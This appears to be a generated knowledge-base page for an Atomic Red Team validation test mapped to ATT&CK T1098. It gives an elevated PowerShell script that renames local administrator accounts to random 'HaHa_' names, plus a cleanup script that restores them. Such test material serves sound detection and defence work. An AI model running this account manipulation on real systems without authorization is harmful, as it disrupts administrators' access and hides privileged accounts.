---
atomic_guid: "5598f7cb-cf43-455e-883a-f6008c5d46af"
title: "Admin Account Manipulate"
framework: "atomic"
generated: "true"
attack_technique_id: "T1098"
attack_technique_name: "Account Manipulation"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "5598f7cb-cf43-455e-883a-f6008c5d46af"
  - "Admin Account Manipulate"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Admin Account Manipulate

Manipulate Admin Account Name

## Metadata

- Atomic GUID: 5598f7cb-cf43-455e-883a-f6008c5d46af
- Technique: T1098: Account Manipulation
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1098/T1098.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1098-account_manipulation|T1098]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHa_$x$y$z

$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match "User" -and $_.PrincipalSource -match "Local"} | Select Name

foreach($member in $fmm) {
    if($member -like "*Administrator*") {
        $account = $member.Name.Split("\")[-1] # strip computername\
        $originalDescription = (Get-LocalUser -Name $account).Description
        Set-LocalUser -Name $account -Description "atr:$account;$originalDescription".Substring(0,48) # Keep original name in description
        Rename-LocalUser -Name $account -NewName "HaHa_$x$y$z" # Required due to length limitation
        Write-Host "Successfully Renamed $account Account on " $Env:COMPUTERNAME
        }
    }
```

### Cleanup

```powershell
$list = Get-LocalUser |?{$_.Description -like "atr:*"}
foreach($u in $list) {
  $u.Description -match "atr:(?<Name>[^;]+);(?<Description>.*)"
  Set-LocalUser -Name $u.Name -Description $Matches.Description
  Rename-LocalUser -Name $u.Name -NewName $Matches.Name
  Write-Host "Successfully Reverted Account $($u.Name) to $($Matches.Name) on " $Env:COMPUTERNAME
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.yaml)
